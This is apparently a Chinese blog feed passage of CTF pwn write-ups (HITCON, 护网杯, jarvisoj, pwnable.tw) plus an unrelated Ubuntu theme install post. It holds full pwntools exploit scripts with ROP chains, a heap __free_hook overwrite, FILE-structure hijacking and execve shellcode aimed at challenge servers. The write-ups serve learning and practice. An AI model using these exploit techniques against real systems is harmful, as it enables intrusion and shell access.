0x2000, write_1, write_2); return v5 ^ _stack_chk_guard;&#125; 这里可以发现，它将stdout的地址打印出来了，所以可以计算出libc的地址。然后它往&amp;unk_12018写入0x30个字节的内容,通过这个可以将在bss段上的 write_1和write_2两个函数指针给覆盖掉，而这两个函数在后面都会执行，所以这里可以获得两次调用函数的机会，但是要怎么getshell呢。这里我看到大佬们用了一个很骚的函数 getusershell()，先执行getusershell()函数，将”/bin/sh”存储在x0寄存器中，然后再执行system函数 arm64的调用约定:参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。 exp: 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *local = 0debug = 0if local: if debug: p = process(["qemu-aarch64", "-g", "1234", "-L", "./", "tooooo"]) else: p = process(["qemu-aarch64", "-L", "./", "tooooo"])else: p = remote("13.230.48.252","4869") elf = ELF("tooooo")libc = ELF("./lib/libc.so.6")context.binary = "tooooo"context.log_level = "debug"libc_base = int(p.recvline().strip("\n"),16) - libc.symbols['_IO_2_1_stdout_']print hex(libc_base)libc.address = libc_basepayload = 'a'*0x20 + p64(libc.symbols["getusershell"]) + p64(libc.symbols["system"])p.sendline(payload)p.interactive() reference: D4rk3r大佬的writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[护网杯wp及复现]]></title>
    <url>%2F2018%2F10%2F16%2F2018-10-14-%E6%8A%A4%E7%BD%91%E6%9D%AFwp%E5%8F%8A%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[昨天刚打完护网杯线上赛，被自己菜哭，菜的真实，所以现在来赛后复现了 start签到题，就是覆盖栈上的变量为特定的值，有点新奇的就是有一个变量要覆盖成小数0.1 0.1 在内存中存储形式为 0x3fb999999999999a exp： 12345678910111213141516171819202122#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./gettingstart') elf = ELF('./gettingstart') libc = elf.libcelse: host = '49.4.94.186' port = '32680' p = remote(host,port) elf = ELF('./gettingstart')context.arch = elf.archcontext.log_level='debug'p.recvuntil("you.\n")payload = "1"*0x18+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3fb999999999999a)p.send(payload)p.interactive() shopping很气人 ，我离做出就差一个__free_hook 防护机制： 1234567☁ shopping checksec shopping [*] &apos;/home/zs0zrc/game/huwangbei/PWN/shopping /shopping&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 通过ida分析下程序逻辑 大致有两个功能 get_monye 获得money buy 购买物品 12345678910111213141516171819202122232425unsigned __int64 getmoney()&#123; unsigned __int64 v0; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); while ( 1 ) &#123; while ( 1 ) &#123; puts("EMMmmm, you will be a rich man!"); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); if ( v0 != 2 ) break; puts_something(); &#125; if ( v0 == 3 ) break; if ( v0 == 1 ) get_money(); &#125; return __readfsqword(0x28u) ^ v3;&#125; 然后buy中又存在三个功能 get_goods 获得商品 delete_goods 删除商品 edit_goods 编辑商品 1234567891011121314151617181920212223242526272829303132333435unsigned __int64 buy()&#123; unsigned __int64 v0; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); do &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts("Now, buy buy buy!"); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); if ( v0 != 2 ) break; free_goods(); &#125; if ( v0 &gt; 2 ) break; if ( v0 == 1 ) get_goods(); &#125; if ( v0 != 3 ) break; edit_goods(); &#125; &#125; while ( v0 != 4 ); return __readfsqword(0x28u) ^ v3;&#125; 这道题目的漏洞在edit_goods函数中，它用strtoul函数来获取商品的下标 它的函数原型是 123unsigned long strtoul (const char* str, char** endptr, int base);endstr 为第一个不能转换的字符的指针，base 为字符串 str 所采用的进制。strtoul() 会扫描参数 str 字符串，跳过前面的空白字符 漏洞点 1234idx = strtoul(&amp;s, 0LL, 0);printf("OK, what would you like to modify %s to?\n", *buy_array[idx], idx);*(*buy_array[v1] + read(0, *buy_array[v1], 8uLL)) = 0;//没有对输入的值的下限进行检查，可以读取一个负数，造成数组下标溢出 泄露信息只要先生成一个unsorted bin大小的chunk，然后delete它，再malloc(0)，就可以泄露出libc的信息 这里要借助get_money中生成的两个数组来实现任意地址写，因为edit功能是通过二重引用指针，修改的是buy_array[idx]的内容指向的地址上的内容，而money_array数组中存储着array数组的地址，所以我们修改edit_goods修改money_array的内容，在array中布置我们想要修改的地址，最后再修改array对应的位置， 就可以实现任意地址写 1234567891011121314if ( counts_g &lt;= 0x13 )&#123; puts("I will give you $9999, but what's the currency type you want, RMB or Dollar?"); v1 = malloc(0x10uLL); v2 = v1; v1[1] = 0x270FLL; fgets(&amp;array[8 * counts_g], 8, stdin); *v2 = &amp;array[8 * counts_g]; v3 = counts_g++; v4 = 8 * v3; v0 = &amp;money_array; *(&amp;money_array + v4) = v2;&#125; 这里我看writeup看到很多种做法， 改__free_hook为system,再free掉一个包含”sh”字符串的chunk 改libc里面的 malloc@got为one_gadget，然后再生成一个chunk就可以getshell，但是这个libc中的got表我在网上怎么都查不到，真的是学到了 还有一种没有用到chunk的，直接就数组下标溢出做的wirteup 各位师傅真的是tql，我的exp用的是第一种 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./shopping') elf = ELF('./shopping') libc = elf.libcelse: host = '117.78.26.200' port = '32599' p = remote(host,port) elf = ELF('./shopping') libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')context.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) log.info("text_base:&#123;&#125;".format(hex(text_base))) log.info("buy_array:&#123;&#125;".format(hex(text_base + 0x2021E0))) log.info("get_array:&#123;&#125;".format(hex(text_base + 0x202140))) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def get_money(): ru("EMMmmm, you will be a rich man!\n") for i in range(0x14): sl('1') rc() sl('1234') ru("EMMmmm, you will be a rich man!\n") sl('3')def buy_goods(size,name): ru('Now, buy buy buy!\n') sl('1') ru('How long is your goods name?\n') sl(str(size)) ru(' name?\n') sl(name)def edit_goods(idx,name): rc() sl('3') rc() sl(idx) ru(" to?\n") sd(name)def delete_goods(idx): rc() sl('2') rc() sl(str(idx))get_money()buy_goods(0x88,'a'*8)#0buy_goods(0x88,'sh')#1buy_goods(0x88,'a'*8)#2delete_goods(0)buy_goods(0,'')pause()log.info("---------leak libc-----------")rc()sl('3')rc()sl('3')ru("modify ")leak = u64(p.recv(6).ljust(8,'\x00')) libc_base = leak - libc.symbols['__malloc_hook'] - 0x10- 216libc.address = libc_baseprint hex(leak)print hex(libc_base)sl('aaaaa')rc()edit_goods(' -1',p64(libc.got['__free_hook']))edit_goods(' -21',p64(libc.symbols['system']))delete_goods(1)p.interactive() huwang防护机制： 1234567☁ huwang checksec huwang [*] &apos;/home/zs0zrc/game/huwangbei/PWN/huwang/huwang&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 这题看起来像是堆的题，但其实堆分配的部分都没用，主要的功能集中在选项666中 它先打开secret文件，往里面写入随机数，然后输入md5加密的次数，循环加密后将结果存入secret中，然后要我们猜在secret存储的md5值。程序在写入md5结果时会先清空文件的内容，并且如果它没对输入的数字的下限进行判断，所以可以输入一个”-1”，程序就会循环执行MD5直到超时杀死自己，导致sercet文件的内容为空。那么md5的值就是可以预测的，16个null的md5也就是 0x000000000000000的MD5 —-&gt;[4ae71336e44bf9bf79d2752e234818a5] 同时name填0x19个字符可以泄漏出canary ，md5猜成功后会进入success函数，这里存在一个栈溢出，是由snprintf函数造成的，snprintf函数返回的值是想要写入的值，知道了canary就可以用ROP了，先泄露出libc地址，然后构造rop链调用system函数 123456789101112131415161718192021222324252627282930int __fastcall sub_40101C(__int64 a1)&#123; char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char v4; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf("Congratulations, %s guessed my secret!\n", a1); puts("And I want to know someting about you, and introduce you to other people who guess the secret!"); puts("What`s your occupation?"); sub_400CC1(&amp;v4, 255LL); v3 = snprintf( &amp;s, 0xFFuLL, "I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........." "..................................................................................... ............", a1, &amp;v4); puts("Here is your introduce"); puts(&amp;s); puts("Do you want to edit you introduce by yourself[Y/N]"); v1 = getchar(); getchar(); if ( v1 == 'Y' ) read(0, &amp;s, v3 - 1); //stack overflow return printf("The final presentation is as follows:%s\n", &amp;s);&#125; exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/upr/bin/env pythonfrom pwn import *p = process('./huwang')elf = ELF('./huwang')libc = elf.libccontext.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def prepare(): p.sendlineafter("command&gt;&gt; \n",'666') p.sendlineafter("name\n",'a'*0x8) p.sendlineafter("secret?\n","y") p.sendlineafter("secret:\n", '-1') p.recvuntil('timeout~') def expoit(): p = process('./huwang') p.sendlineafter("command&gt;&gt; \n",'666') p.sendafter("name\n",'a'*0x18+"#") p.sendlineafter("secret?\n","y") p.sendlineafter("secret:\n", '1') p.sendafter('secret\n', "J\xe7\x136\xe4K\xf9\xbfy\xd2u.#H\x18\xa5") p.recvuntil("#") canary = u64('\0' + p.recv(7)) print hex(canary) p.recvuntil("occupation?\n") p.send('a'*0xff) p.sendlineafter("[Y/N]\n","Y") pop_rdi = 0x401573 leave_ret = 0x400d45 ret = 0x40101C ropchain = 'a'*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts'])+ p64(ret) p.sendline(ropchain) p.recvuntil("Congratulations, ") libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['puts'] libc.address = libc_base payload = 'a'*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(libc.search('/bin/sh').next()) + p64(libc.symbols['system']) p.recvuntil("occupation?\n") p.send('a'*0xff) p.sendlineafter("[Y/N]\n","Y") p.sendline(payload) p.interactive() prepare()expoit() 被23R3F大佬鞭策，回来把剩下的两道题复现下 six大佬们的writeup： 23R3F 防护机制： 1234567☁ six checksec six[*] &apos;/home/zs0zrc/pwn/huwangbei/six/six&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖入ida简单逆向下,程序一开始先用mmap分配了两个区域 12345678910111213141516171819202122unsigned __int64 init_fuc()&#123; int fd; // ST04_4 __int64 buf; // [rsp+8h] [rbp-18h] __int64 v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); fd = open("/dev/urandom", 0); read(fd, &amp;buf, 6uLL); read(fd, &amp;v3, 6uLL); text = mmap((v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL); //text段具有rwx权限，用来存放要执行的代码 stacks = mmap((buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500; //stacks用来模拟栈 //这里分配的空间，当两个地址冲突或者不符合条件时，就会随机分配，随机分配的两个区域是相邻的，相邻时stacks与text的距离为0xb00 return __readfsqword(0x28u) ^ v4;&#125; 然后输入6个字节的shellcode,将shellcode放入text中，且shellcode要满足三个奇数，三个偶数 1234567891011121314151617181920212223242526272829303132__int64 __fastcall sub_B05(__int64 a1)&#123; __int64 result; // rax unsigned int v2; // [rsp+10h] [rbp-10h] int v3; // [rsp+14h] [rbp-Ch] signed int i; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] v2 = 0; v3 = 0; for ( i = 0; i &lt;= 5; ++i ) &#123; if ( *(i + a1) &amp; 1 ) ++v2; else ++v3; for ( j = i + 1; j &lt;= 5; ++j ) &#123; if ( *(i + a1) == *(j + a1) ) &#123; puts("Invalid shellcode!"); exit(0); &#125; &#125; &#125; result = v2; if ( v2 == v3 ) return result; puts("Invalid shellcode!"); exit(0); return result;&#125; 在执行我们输入的shellcode前，程序会先执行一段代码 1234567891011121314151617Disassembly:0: 48 89 fc mov rsp,rdi3: 48 31 ed xor rbp,rbp6: 48 31 c0 xor rax,rax9: 48 31 db xor rbx,rbxc: 48 31 c9 xor rcx,rcxf: 48 31 d2 xor rdx,rdx12: 48 31 ff xor rdi,rdi15: 48 31 f6 xor rsi,rsi18: 4d 31 c0 xor r8,r81b: 4d 31 c9 xor r9,r91e: 4d 31 d2 xor r10,r1021: 4d 31 db xor r11,r1124: 4d 31 e4 xor r12,r1227: 4d 31 ed xor r13,r132a: 4d 31 f6 xor r14,r142d: 4d 31 ff xor r15,r15 这是从src变量中提出出来的，这里做的就是将rsp指向mmap出来用作栈的空间，然后将各个寄存器清零。 因为这里将rax置0了，所以如果进行syscall的话就会调用read函数，往stack上写入内容。如果此时stacks和text是mmap随机分配的，那么这两个区域会是相邻的，stacks在低地址。从rsp开始覆写，可以覆盖代码段。 调用read函数的shellcode 12340: 54 push rsp1: 5e pop rsi2: 89 f2 mov edx,esi4: 0f 05 syscall exp： 1234567891011121314151617181920212223#!/usr/bin/env pythonfrom pwn import *elf = ELF('./six')libc = elf.libccontext.arch = elf.archcontext.log_level='debug'def exploit(): p = process('./six') shellcode1='''push rsp;pop rsi;mov edx,esi;syscall''' p.sendafter(':',asm(shellcode1)) paylaod ='\x90'*0xb36+asm(shellcraft.sh()) p.send(paylaod) p.interactive()while 1: try: exploit() except Exception: pass calender待填 大佬们的writeup 天枢 Whitzard 师傅的writeup 大佬的writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu主题Flatabulous安装]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-Ubuntu%E4%B8%BB%E9%A2%98Flatabulous%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[最近看到一个超好看的Ubuntu主题 —-&gt; Flatabulous 大致长这样子，我的Ubuntu版本是 16.04 ，所以之前的ubuntu-tweak就没用了， 我改用gnome-tweak-tool 首先装一个 gnome-tweak-tool 1sudo apt-get install gnome-tweak-tool 然后安装Flatabulous这个主题 123456789第一种方法：sudo add-apt-repository ppa:noobslab/themessudo apt-get updatesudo apt-get install flatabulous-theme第二种方法：sudo chown $USER:$USER -R /usr/share/themes/sudo chmod 755 -R /usr/share/themes/cd /usr/share/themes/git clone https://github.com/anmoljagetia/Flatabulous 安装ultra-flat-icons 123sudo add-apt-repository ppa:noobslab/iconssudo apt-get updatesudo apt-get install ultra-flat-icons 然后用gnome-tweak-tool配置 ​ 最后就可以看到超酷的界面了，如果没有变化的话重启一下就可以看到了]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探arm下的pwn]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-%E5%88%9D%E6%8E%A2arm%E4%B8%8B%E7%9A%84pwn%2F</url>
    <content type="text"><![CDATA[最近做了下InCTF，第一道pwn题就是arm架构的，之前没有接触过，就学习一下 基础知识可以看下维基百科的arm架构 ，介绍的挺详细的 arm下的通用寄存器 函数调用约定： ARM：参数1~参数4 分别保存到 R0~R3 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 R0 中。 ARM64：参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。 arm下的pc相当于eip或者rip，保存着下一条要执行的指令的地址 环境准备这里我没装新的虚拟机，我直接在ubuntu16.04装的环境 安装gdb-multiarch，用来调试多架构的程序 1sudo apt-get install gdb-multiarch 安装qemu 1sudo apt-get install qemu-user 安装程序架构对应的共享库 简单运行下程序，看需要什么共享库 12$ ./wARMup [19:42:58]/lib/ld-linux-armhf.so.3: No such file or directory 然后再终端输入 123456789101112131415zs0zrc@ubuntu: ~/game/InCTF/PWN/WARMUP$ apt-cache search &quot;libc6&quot; | grep arm [10:34:21]libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-armel-armhf-cross - Dummy package to get libc6:armel installedlibc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armhf-armel-cross - Dummy package to get libc6:armhf installedlibc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (for cross-compiling)libc6-dbg-armel-cross - GNU C Library: detached debugging symbols (for cross-compiling)libc6-dbg-armhf-cross - GNU C Library: detached debugging symbols (for cross-compiling)libc6-dev-armel-armhf-cross - Dummy package to get libc6-dev:armel installedlibc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armhf-armel-cross - Dummy package to get libc6-dev:armhf installed 安装对应的共享库 通过 sudo apt-get install libc6-armhf-cross 来安装 运行 程序运行需要用qemu来指定它共享库的位置 12参数 -L指定共享库的位置qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup 调试的话用gdb-multiarch 先用qemu将程序映射到某个端口，参数为-g 然后用gdb-multiarch开启远程调试 123456先用qemu映射到端口1234qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf/ ./wARMup然后用gdb-multiarch开启远程调试pwndbg&gt; set architecture armThe target architecture is assumed to be armpwndbg&gt; target remote localhost:1234 题目typo这是jarvisoj平台上的一道pwn题 防护机制: 123456[*] &apos;/home/zs0zrc/pwn/jarvisoj/typo/typo&apos; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) 文件信息： 12☁ typo file typotypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped 说明这个程序是静态链接，所以程序中一定会有system函数以及”/bin/sh”字符串，但是用ida反编译时会发现函数的符号都被去除了，但是可以在字符串表找到”/bin/sh”字符串，这里用rizzo插件恢复下符号。 做法： 1234567891011121314151617将arm的libc.so文件拖入ida然后在选择 file--&gt;Produce file--&gt;Rizzo signature file导出符号文件 然后用ida打开typo 选择 file--&gt;Load file--&gt;Rizzo signature file就可以看到一些函数符号了char *__fastcall system(int a1)&#123; char *result; // r0 if ( a1 ) result = sub_10BA8(a1); else result = (sub_10BA8("exit 0") == 0); return result;&#125; 简单运行下程序，程序要我们输入一个字符串，因为arm下的pwn一般是栈溢出居多，而且防护机制没开canary，所以用pwndbg测了下栈的大小 12pwndbg&gt; cyclic -l 0x62616164112 栈的长度为112，接下来就是找能控制r0和pc的gadget，这里我用的是ropper 12345678910111213(typo/ELF/ARM)&gt; search pop|ret |grep r0[INFO] Searching for gadgets: pop|ret |grep r0[INFO] File: typo0x00011364: pop &#123;lr&#125;; add sp, sp, #0x10; bx lr; 0x00011398: pop &#123;lr&#125;; add sp, sp, #0xc; bx lr; 0x0001db98: pop &#123;lr&#125;; b #0x11e38; mov r1, lr; pop &#123;lr&#125;; bx r3; 0x0001dba4: pop &#123;lr&#125;; bx r3; 0x00053ea8: pop &#123;pc&#125;; mov r0, #0; bx lr; 0x00050f30: pop &#123;pc&#125;; mov r0, r3; bx lr; 0x00053078: pop &#123;r0, r1, r2, r3, r4, lr&#125;; bx ip; 0x00053d64: pop &#123;r0, r1, r3, ip, lr&#125;; pop &#123;r2&#125;; ldr r1, [r0, #4]; bx r1; 0x00020904: pop &#123;r0, r4, pc&#125;; //选择的gadget 之后就是ROP就行了 exp: 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env pythonfrom pwn import *local = 1debug = 0if local: p = remote("pwn2.jarvisoj.com","9888")elif debug: p = process(["qemu-arm", "-g", "1234", "-L", "arm-linux-gnueabihf", "typo"]) else: p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "typo"])elf = ELF("typo")libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")context.binary = "typo"context.log_level = "debug"def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()sl('')payload = 'a'*112 + p32(0x00020904) + p32(0x0006c384) + p32(0) + p32(0x000110B4)rc()sl(payload)p.interactive() reference: 调用约定 M4x大佬博客 D4rk3r大佬博客]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw writeup]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-pwnable.tw-writeup%2F</url>
    <content type="text"><![CDATA[start 防护机制： 12345670 % checksec start [*] &apos;/home/zs0zrc/pwn/pwnable.tw/start/start&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 用ida看了下程序，发现只有十几行汇编代码 12345678910111213141516171819202122232425262728293031.text:08048060 ; =============== S U B R O U T I N E =======================================.text:08048060.text:08048060.text:08048060 public _start.text:08048060 _start proc near.text:08048060 push esp.text:08048061 push offset _exit.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx.text:0804806E push &apos;:FTC&apos;.text:08048073 push &apos; eht&apos;.text:08048078 push &apos; tra&apos;.text:0804807D push &apos;ts s&apos;.text:08048082 push 2774654Ch.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX -.text:08048099 add esp, 14h.text:0804809C retn.text:0804809C _start endp ; sp-analysis failed.text:0804809C.text:0804809D.text:0804809D ; =============== S U B R O U T I N E ======================================= 这里实现了wirte 和read的系统调用，在调用read时存在栈溢出。看到防护机制后想到的做法就是 往栈上写shellcode，然后执行shellcode。具体要先泄露stack的地址，然后往栈上写shellcode再覆盖返回地址为shellcode的地址，最后跳转去执行shellcode exp： 123456789101112131415161718from pwn import*context.log_level = 'debug'#p = remote('chall.pwnable.tw',10000)p = process('./start')shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73"\ "\x68\x68\x2f\x62\x69\x6e\x89"\ "\xe3\x89\xc1\x89\xc2\xb0\x0b"\ "\xcd\x80\x31\xc0\x40\xcd\x80"p.recv()payload = 'a'*0x14 + p32(0x08048087)#writep.send(payload)leak = u32(p.recv(4))stack = leak + 0x10print "leak_stack --&gt;[%s]"%hex(leak_stack)p.send('a'*0x14+p32(leak_stack+0x4)+shellcode)p.interactive() orw 这题之前做过类似的 ，就是HITCON-Training-master的lab2 这题也是要执行shellcode，不过它限制了可以执行的函数，要求用open read和write 3个函数来读取flag 我拿以前的脚本改了下就打通了 exp: 123456789101112131415161718192021222324252627282930#!/usr/bin/env python # -*-: coding: UTF-8 -*- from pwn import* context.log_level = 'debug'#p = process('./orw') p = remote('chall.pwnable.tw',10001)shellcode = '''mov eax,0x5 push 0x6761push 0x6c662f77push 0x726f2f65push 0x6d6f682fmov ebx,espxor ecx,ecxint 0x80 mov eax,0x3 mov ecx,ebx mov ebx,0x3 mov dl,0x30 int 0x80 mov eax,0x4 mov bl,0x1 int 0x80 ''' payload = asm(shellcode) p.recv() p.send(payload) p.interactive() 不过这个我看别人的wp又学到了一种姿势，就是用pwntools的 函数自动生成对应函数的shellcode 12345shellcode = ''shellcode += shellcraft.pushstr('/home/orw/flag')#往栈上压入字符串shellcode += shellcraft.open('esp', 0, 0)#设置参数shellcode += shellcraft.read('eax', 'esp', 100)shellcode += shellcraft.write(1, 'esp', 100) seethefile防护机制： 123456[*] &apos;/home/zs0zrc/pwn/pwnable.tw/seethefile/seethefile&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序一共五个功能 Open : 打开一个文件，但是不能打开flag文件 Read ： 读取文件的0x18字节的内容 Write to screen ： 将读取的内容打印出来 Close ： 关闭文件流 Exit ： 读取名字，同时关闭文件流并退出程序 程序的文件流指针存放在bss段 123456.bss:0804B280 public fp.bss:0804B280 ; FILE *fp.bss:0804B280 fp dd ? ; DATA XREF: openfile+6↑r.bss:0804B280 ; openfile+AD↑w ....bss:0804B280 _bss ends.bss:0804B280 name变量在fp变量的上面，同时程序读取name时没限制长度，所以可以覆盖fp指针，通过伪造_IO_FILE_plus结构体，覆盖fp指针指向伪造的结构体，最后通过fclose函数关闭fp来getshell,即劫持fp指针 不过要先知道libc的地址，libc的地址可以通过读取 /proc/self/maps文件来来得到 泄露libc地址 1234567891011121314151617181920212223242526def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()sl('1')rc()sl('/proc/self/maps')rc()sl('2')rc()sl('2')rc()sl('3')leak = ru("r-xp")libc_base = int("0x"+leak[-22:-14],16)print hex(libc_base)system = libc_base + libc.symbols['system'] 伪造fake_file 123456789name_add = 0x804B260fake_file = "/bin/sh\x00"fake_file = fake_file.ljust(0x20,'\x00') fake_file += p32(name_add)#覆盖fp为name_addfake_file = fake_file.ljust(0x48,'\x00')fake_file += p32(name_add + 0x10) # 指向一处值为0的地址fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(0x804b2f8-0x44)#fake vtable address = name_add + 0x98 - 0x44fake_file += p32(system) 但是这题getshell还不够，要拿到flag还要运行服务器上的一个程序….有点骚，他将cat flag 命令删掉了，不过程序源码也给出了，很容易看到逻辑，按照它的判断条件输入，它就会将flag打印出来 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./seethefile') elf = ELF('./seethefile') libc = elf.libcelse: host = 'chall.pwnable.tw' port = '10200' p = remote(host,port) elf = ELF('./seethefile') libc = ELF('./libc_32.so.6')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()sl('1')rc()sl('/proc/self/maps')rc()sl('2')rc()sl('2')rc()sl('3')leak = ru("r-xp")libc_base = int("0x"+leak[-22:-14],16)print hex(libc_base)system = libc_base + libc.symbols['system']name_add = 0x804B260fake_file = "/bin/sh\x00"fake_file = fake_file.ljust(0x20,'\x00') fake_file += p32(name_add)fake_file = fake_file.ljust(0x48,'\x00')fake_file += p32(name_add + 0x10)fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(0x804b2f8-0x44)fake_file += p32(system)sl('5')rc()sl(fake_file)p.interactive() calc防护机制： 1234567☁ calc checksec calc[*] &apos;/home/zs0zrc/pwn/pwnable.tw/calc/calc&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 对它进行简单的逆向，发现它有很多库函数，说面这是静态编译的。用file查看下文件信息 12☁ calc file calccalc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped 它的主函数很简单，很短，主要功能是进行 +、-、 *、 \、%的基本运算。 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; ssignal(14, timeout); alarm(60); puts("=== Welcome to SECPROG calculator ==="); fflush(stdout); calc(); return puts("Merry Christmas!");&#125; 主要功能集中在calc函数 123456789101112131415161718192021unsigned int calc()&#123; pool pool; // [esp+18h] [ebp-5A0h] char s; // [esp+1ACh] [ebp-40Ch] unsigned int v3; // [esp+5ACh] [ebp-Ch] v3 = __readgsdword(0x14u); while ( 1 ) &#123; bzero(&amp;s, 0x400u); // 初始化存储表达式的数组 if ( !get_expr(&amp;s, 1024) ) //读取计算表达式 break; init_pool(&amp;pool); //初始化pool，这个pool结构体我定义了一下 if ( parse_expr(&amp;s, &amp;pool) ) //解析表达式，并计算出结果 &#123; printf("%d\n", pool.data[pool.idx - 1]); //将计算计过打印出来，计算结果存储在pool.data[pool.idx - 1]中 fflush(stdout); &#125; &#125; return __readgsdword(0x14u) ^ v3;&#125; init_pool函数，对pool进行初始化 1234567891011121314pool *__cdecl init_pool(pool *pool)&#123; pool *result; // eax signed int i; // [esp+Ch] [ebp-4h] result = pool; pool-&gt;idx = 0; for ( i = 0; i 